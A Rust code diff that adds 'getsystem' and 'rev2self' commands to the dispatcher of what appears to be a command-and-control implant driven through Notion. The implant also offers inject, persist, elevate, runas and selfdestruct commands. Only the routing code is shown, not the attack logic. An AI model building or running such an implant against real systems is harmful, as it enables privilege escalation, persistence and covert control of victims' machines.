@@ -13,11 +13,13 @@ mod config;
 mod download;
 pub mod elevate;
 pub mod getprivs;
+mod getsystem;
 mod inject;
 mod persist;
 mod portscan;
 mod ps;
 mod pwd;
+mod rev2self;
 mod runas;
 mod save;
 pub mod shell;
@@ -52,11 +54,13 @@ pub enum CommandType {
     Download,
     Elevate,
     Getprivs,
+    Getsystem,
     Inject,
     Portscan,
     Persist,
     Ps,
     Pwd,
+    Rev2Self,
     Save,
     Selfdestruct,
     Runas,
@@ -169,24 +173,26 @@ impl NotionCommand {
             let command_args  = CommandArgs::from_split(command_words);
 
             let command_type: CommandType = match t {
-                "cd"       => CommandType::Cd,
-                "config"   => CommandType::Config,
-                "download" => CommandType::Download,
-                "elevate"  => CommandType::Elevate,
-                "getprivs" => CommandType::Getprivs,
-                "inject"   => CommandType::Inject,
-                "persist"  => CommandType::Persist,
-                "portscan" => CommandType::Portscan,
-                "ps"       => CommandType::Ps,
-                "pwd"      => CommandType::Pwd,
-                "runas"    => CommandType::Runas,
-                "save"     => CommandType::Save,
+                "cd"           => CommandType::Cd,
+                "config"       => CommandType::Config,
+                "download"     => CommandType::Download,
+                "elevate"      => CommandType::Elevate,
+                "getprivs"     => CommandType::Getprivs,
+                "getsystem"    => CommandType::Getsystem,
+                "inject"       => CommandType::Inject,
+                "persist"      => CommandType::Persist,
+                "portscan"     => CommandType::Portscan,
+                "ps"           => CommandType::Ps,
+                "pwd"          => CommandType::Pwd,
+                "rev2self"     => CommandType::Rev2Self,
+                "runas"        => CommandType::Runas,
+                "save"         => CommandType::Save,
                 "selfdestruct" => CommandType::Selfdestruct,
-                "shell"    => CommandType::Shell,
-                "shutdown" => CommandType::Shutdown,
-                "sysinfo"  => CommandType::Sysinfo,
-                "whoami"   => CommandType::Whoami,
-                _          => CommandType::Unknown,
+                "shell"        => CommandType::Shell,
+                "shutdown"     => CommandType::Shutdown,
+                "sysinfo"      => CommandType::Sysinfo,
+                "whoami"       => CommandType::Whoami,
+                _              => CommandType::Unknown,
             };
             return Ok(NotionCommand { command_type: command_type, args: command_args});
 
@@ -197,24 +203,26 @@ impl NotionCommand {
     /// Executes the appropriate function for the `command_type`. 
     pub async fn handle(&mut self, config_options: &mut ConfigOptions, logger: &Logger) -> Result<String, Box<dyn Error>> {
         match &self.command_type {
-            CommandType::Cd       => cd::handle(&mut self.args),
-            CommandType::Config    => config::handle(&mut self.args, config_options, logger).await,
-            CommandType::Download => download::handle( &mut self.args, logger).await,
-            CommandType::Elevate  => elevate::handle(&mut self.args, config_options).await,
-            CommandType::Getprivs    => getprivs::handle().await,
-            CommandType::Inject   => inject::handle(&mut self.args, logger).await,
-            CommandType::Persist  => persist::handle(&mut self.args, config_options, logger).await,
-            CommandType::Portscan => portscan::handle(&mut self.args, logger).await,
-            CommandType::Ps          => ps::handle().await,
-            CommandType::Pwd         => pwd::handle().await,
-            CommandType::Runas    => runas::handle(&self.args).await,
-            CommandType::Save     => save::handle(&mut self.args, config_options).await,
+            CommandType::Cd           => cd::handle(&mut self.args),
+            CommandType::Config       => config::handle(&mut self.args, config_options, logger).await,
+            CommandType::Download     => download::handle( &mut self.args, logger).await,
+            CommandType::Elevate      => elevate::handle(&mut self.args, config_options).await,
+            CommandType::Getprivs     => getprivs::handle().await,
+            CommandType::Getsystem    => getsystem::handle(logger).await,
+            CommandType::Inject       => inject::handle(&mut self.args, logger).await,
+            CommandType::Persist      => persist::handle(&mut self.args, config_options, logger).await,
+            CommandType::Portscan     => portscan::handle(&mut self.args, logger).await,
+            CommandType::Ps           => ps::handle().await,
+            CommandType::Pwd          => pwd::handle().await,
+            CommandType::Rev2Self     => rev2self::handle().await,
+            CommandType::Runas        => runas::handle(&self.args).await,
+            CommandType::Save         => save::handle(&mut self.args, config_options).await,
             CommandType::Selfdestruct => selfdestruct::handle().await,
-            CommandType::Shell    => shell::handle(&mut self.args).await,
-            CommandType::Shutdown    => shutdown::handle().await,
-            CommandType::Sysinfo    => sysinfo::handle().await,
-            CommandType::Whoami      => whoami::handle().await,
-            CommandType::Unknown  => unknown::handle().await,
+            CommandType::Shell        => shell::handle(&mut self.args).await,
+            CommandType::Shutdown     => shutdown::handle().await,
+            CommandType::Sysinfo      => sysinfo::handle().await,
+            CommandType::Whoami       => whoami::handle().await,
+            CommandType::Unknown      => unknown::handle().await,
         }
     }
 }
